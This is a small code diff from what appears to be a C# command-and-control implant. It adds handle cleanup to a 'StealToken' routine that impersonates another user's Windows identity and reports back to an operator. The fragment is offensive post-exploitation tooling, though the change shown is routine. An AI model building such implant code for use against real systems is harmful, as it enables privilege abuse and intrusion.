@@ -57,6 +57,8 @@ namespace SaltedCaramel
                         Debug.WriteLine("[+] StealToken - Successfully impersonated " + ident.Name);
                         implant.PostResponse(new SCTaskResp(task.id, "Successfully impersonated " + ident.Name));
                         ident.Dispose();
+                        Win32.CloseHandle(tokenHandle);
+                        procHandle.Close();
                         implant.SendComplete(task.id);
                     }
                     catch (Exception e) // Catch errors thrown by DuplicateTokenEx
